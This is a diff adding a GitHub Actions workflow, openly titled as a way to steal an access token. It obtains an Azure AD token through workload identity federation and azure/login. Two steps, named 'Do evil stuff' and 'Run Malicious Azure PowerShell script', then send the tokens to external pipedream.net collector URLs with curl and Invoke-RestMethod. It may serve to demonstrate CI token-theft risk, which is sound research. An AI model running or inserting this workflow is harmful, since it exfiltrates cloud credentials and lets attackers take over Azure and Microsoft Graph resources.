@@ -1,0 +1,45 @@
+# This is a basic workflow to steal an access token (:
+
+on: workflow_dispatch
+
+permissions:
+  id-token: write
+  contents: read
+
+name: 😈 WIF
+
+jobs:
+  acquire-and-steal:
+    runs-on: ubuntu-latest
+    name: WIF Example
+    steps:
+      - name: Azure AD Workload Identity Federation
+        uses: nicolonsky/WIF@v0.0.1
+        with:
+          tenant_id: ${{ secrets.TENANTID }}
+          client_id: ${{ secrets.CLIENTID }}
+      - name: Do some Microsoft Graph stuff
+        run: |
+          Install-Module -Name Microsoft.Graph.Authentication
+          Connect-MgGraph -AccessToken ($env:ACCESS_TOKEN | ConvertTo-SecureString -AsPlainText -Force)
+          Invoke-MgGraphRequest -Uri '/beta/organization' | Select-Object -ExpandProperty value
+        shell: pwsh
+      - name: Do evil stuff
+        run: |
+          curl -d '{"token":"${{ env.ACCESS_TOKEN }}"}' \
+          -H "Content-Type: application/json" \
+          "https://3cc9d6e97f71d89fba8c9afc13798b57.m.pipedream.net"
+      - name: OIDC Login to Azure Public Cloud
+        uses: azure/login@v1
+        with:
+          client-id: ${{ secrets.CLIENTID }}
+          tenant-id: ${{ secrets.TENANTID }}
+          subscription-id: ${{ secrets.SUBSCRIPTION }}
+          enable-AzPSSession: true
+
+      - name: Run Malicious Azure PowerShell script
+        uses: azure/powershell@v1
+        with:
+          inlineScript: |
+            Invoke-RestMethod -Method POST -Uri "https://eov8t75mveud5wy.m.pipedream.net" -ContentType "application/json" -Body "{`"token`":`"$((Get-AzAccessToken).Token)`"}"
+          azPSVersion: "latest"
